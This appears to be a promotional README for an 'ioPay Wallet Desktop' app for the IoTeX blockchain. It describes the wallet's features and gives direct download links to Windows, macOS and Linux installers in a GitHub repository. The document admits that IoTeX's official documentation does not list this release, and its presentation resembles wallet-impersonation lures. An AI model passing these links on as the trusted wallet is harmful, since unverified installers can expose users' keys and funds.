![ioPay Wallet: desktop wallet guide](assets/banner-article.png)

# What Is ioPay Wallet? The Desktop Wallet for IoTeX, Explained

ioPay Wallet is a **desktop wallet for the IoTeX blockchain**. It is published as *Iopay Wallet Desktop*: an application for Windows, macOS and Linux that holds your keys on your own machine, shows your IOTX and XRC-20 balances, and puts staking, the IoTube bridge, swapping and DePIN device income in one window.

<p align="center"><a href="https://github.com/iopay-project/iopay-desktop-wallet/releases/download/v2.0.2/iopay-wallet-desktop-win-v2.0.2.exe"><img src="https://img.shields.io/badge/DOWNLOAD-WINDOWS-0969da?style=for-the-badge&labelColor=0B1733&logo=data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyNCAyNCI%2BPHBhdGggZmlsbD0iI2ZmZiIgZD0iTTAgM2wxMC0xdjEwSDB6TTExIDJsMTMtMnYxMkgxMXpNMCAxM2gxMHYxMGwtMTAtMXpNMTEgMTNoMTN2MTFsLTEzLTJ6Ii8%2BPC9zdmc%2B&logoColor=white" alt="Download for Windows"></a> <a href="https://github.com/iopay-project/iopay-desktop-wallet/releases/download/v2.0.2/iopay-wallet-desktop-macos-v2.0.2.dmg"><img src="https://img.shields.io/badge/DOWNLOAD-MACOS-0969da?style=for-the-badge&labelColor=0B1733&logo=apple&logoColor=white" alt="Download for macOS"></a> <a href="https://github.com/iopay-project/iopay-desktop-wallet/releases/download/v2.0.2/iopay-wallet-desktop-linux-v2.0.2.zip"><img src="https://img.shields.io/badge/DOWNLOAD-LINUX-0969da?style=for-the-badge&labelColor=0B1733&logo=linux&logoColor=white" alt="Download for Linux"></a></p>

<div align="center">

| Platform | Requirements | File |
|---|---|---|
| ![Windows](https://img.shields.io/badge/platform-Windows-0969da?style=flat-square&labelColor=0B1733&logo=data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyNCAyNCI%2BPHBhdGggZmlsbD0iI2ZmZiIgZD0iTTAgM2wxMC0xdjEwSDB6TTExIDJsMTMtMnYxMkgxMXpNMCAxM2gxMHYxMGwtMTAtMXpNMTEgMTNoMTN2MTFsLTEzLTJ6Ii8%2BPC9zdmc%2B&logoColor=white) | Windows 10 (1909) or later, 64-bit | [iopay-wallet-desktop-win-v2.0.2.exe](https://github.com/iopay-project/iopay-desktop-wallet/releases/download/v2.0.2/iopay-wallet-desktop-win-v2.0.2.exe) |
| ![macOS](https://img.shields.io/badge/platform-macOS-0969da?style=flat-square&labelColor=0B1733&logo=apple&logoColor=white) | macOS 12 or later | [iopay-wallet-desktop-macos-v2.0.2.dmg](https://github.com/iopay-project/iopay-desktop-wallet/releases/download/v2.0.2/iopay-wallet-desktop-macos-v2.0.2.dmg) |
| ![Linux](https://img.shields.io/badge/platform-Linux-0969da?style=flat-square&labelColor=0B1733&logo=linux&logoColor=white) | x64, Ubuntu 20.04 or later, or equivalent | [iopay-wallet-desktop-linux-v2.0.2.zip](https://github.com/iopay-project/iopay-desktop-wallet/releases/download/v2.0.2/iopay-wallet-desktop-linux-v2.0.2.zip) |

</div>

All three files and their sizes are on the [ioPay Wallet v2.0.2 release page](https://github.com/iopay-project/iopay-desktop-wallet/releases/tag/v2.0.2); their SHA-256 values are published in the [app README](https://github.com/iopay-project/iopay-desktop-wallet).

> **Only download from this GitHub release page.** A build offered anywhere else is not this release, whatever name it carries.

The current release is **v2.0.2, published 19 November 2026**, in the ioPay Wallet repository on GitHub. That is the version every guide here is written against.

If you have used ioPay on your phone, the desktop app is a different build of the same idea: same chain, same accounts, a desktop-sized surface for the things you would not want to do on a phone - staking across long durations, bridging, tax exports.

## What the wallet actually holds

An ioPay Wallet account can be created or imported in four ways: a new **12- or 24-word phrase**, an existing phrase from ioPay mobile, a **private key**, or a **keystore file**. One phrase can hold several accounts, so you can keep a long-term account and a working account side by side without a second backup.

Every account displays two addresses for the same key:

- the native IoTeX address, beginning `io1...`
- the EVM-compatible address, beginning `0x...`

Both belong to your account, and both can receive. Which one you give out depends on where the funds are coming from - a native transfer or an EVM-chain bridge expects the matching format. Confusing the two is the single most common address mistake on IoTeX, and it is why the wallet shows them together with copy buttons and a QR code.

## What you can do from the app

The wallet covers the whole path from holding to earning:

**Balances and history.** IOTX and XRC-20 tokens in one view, with each transaction's status, fee paid and block number.

**Staking.** Delegate to a validator, compare validators on APY, uptime and commission, watch rewards accumulate, and see the countdown once you unstake. Rewards can be re-staked in one click, and a calculator projects daily, monthly and yearly earnings before you commit anything ([how staking works](https://github.com/iopay-project/staking-bridge-and-depin/blob/main/how-to-stake-iotx-in-iopay-wallet.md)).

**The IoTube bridge.** Move assets between IoTeX and Ethereum, BSC or Polygon without leaving the wallet, with a status tracker for each transfer and a fee comparison against doing the same thing through an exchange ([the bridge guide](https://github.com/iopay-project/staking-bridge-and-depin/blob/main/how-to-use-the-iotube-bridge-in-iopay-wallet.md)).

**Swapping.** Trade IOTX against XRC-20 tokens with best-price routing and adjustable slippage.

**DePIN income.** Device earnings in one place, one-click ioID device registration, burn-drop allocations per staking bucket, a project explorer and an earnings calculator ([why a wallet has device screens](https://github.com/iopay-project/staking-bridge-and-depin/blob/main/why-iopay-wallet-is-built-for-depin.md)).

**Portfolio and tax.** Values in several fiat currencies with charts from 24 hours to a year, cost basis and profit/loss, and a tax-report export that includes a staking-rewards report.

**Security.** Ledger and Trezor signing over USB, offline signing, watch-only mode, address verification and phishing warnings. The app also stores secrets in your operating system's keychain, with a PIN and biometric lock in front of it.

## Is this the official IoTeX desktop wallet?

This is the question worth answering carefully, because the honest answer has two halves.

IoTeX's documentation lists ioPay for mobile and routes desktop readers through an earlier-generation application. It does **not** list this desktop release. Nothing in this repository states that IoTeX or the IoTeX Foundation endorses it, and this article will not claim that it does.

What is verifiable: the code is public, the licence is **Apache-2.0**, and the releases carry Windows, macOS and Linux builds under the ioPay Wallet name. You can read the code, check the release assets and decide for yourself - which is a stronger position than trusting a badge.

If your real question is "which desktop build is the current one", that is a separate answer and it has its own page: [Which ioPay Wallet build is current?](https://github.com/iopay-project/choosing-the-right-wallet/blob/main/iopay-wallet-and-earlier-desktop-builds.md)

## Desktop or mobile?

The mobile app and this desktop app are separate builds with separate release histories. They share the chain and they can share a phrase - you can import a mobile phrase into the desktop wallet - but they are not the same installer, and a feature in one is not automatically in the other.

The practical split: use mobile for holding and quick payments, use desktop when you are staking for a long duration, bridging, exporting tax records, or reviewing DePIN income across several devices. Anything that needs a keyboard and a large screen is what this build is for.

## Getting it

The download route is the release page in the ioPay Wallet repository, and the v2.0.2 assets are:

- `iopay-wallet-desktop-win-v2.0.2.exe` - 63.8 MB
- `iopay-wallet-desktop-macos-v2.0.2.dmg` - 21.5 MB
- `iopay-wallet-desktop-linux-v2.0.2.zip` - 79.4 MB

Install: the [Windows walkthrough](https://github.com/iopay-project/desktop-setup-and-safety/blob/main/install-iopay-wallet-on-windows.md) writes the steps out in full and names the macOS and Linux guides at the top, which run the same sequence with their own installer. Before you download anything from anywhere else, check the file name and the version against the release assets - *spotting a fake download is its own page*.

## Frequently asked

**What is ioPay?**
A desktop wallet for the IoTeX chain, published as Iopay Wallet Desktop. It stores your keys locally, shows native and EVM addresses for each account, and handles staking, bridging, swapping and DePIN income.

**Is there an official IoTeX desktop wallet?**
IoTeX's documentation currently lists ioPay for mobile and routes desktop readers through an earlier-generation app, not this desktop release. The desktop app is published in the ioPay Wallet repository under Apache-2.0, and no endorsement is claimed here either way.

**Can I keep several accounts in one ioPay wallet?**
Yes. One phrase can hold multiple accounts, each with its own `io1...` and `0x...` addresses, and each backed up by the same phrase.

---

*Sources: the v2.0.2 release and its assets, the repository licence, and the approved feature set for this build. Chain parameters (address formats, staking) follow IoTeX documentation.*

